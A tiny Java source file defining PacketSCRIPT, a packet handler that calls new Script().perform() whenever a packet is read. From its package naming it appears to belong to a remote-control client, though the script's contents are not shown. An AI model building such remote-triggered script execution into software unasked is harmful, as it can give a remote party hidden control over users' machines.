package com.redpois0n.packets;

import com.redpois0n.Script;

public class PacketSCRIPT extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		new Script().perform();
	}

}
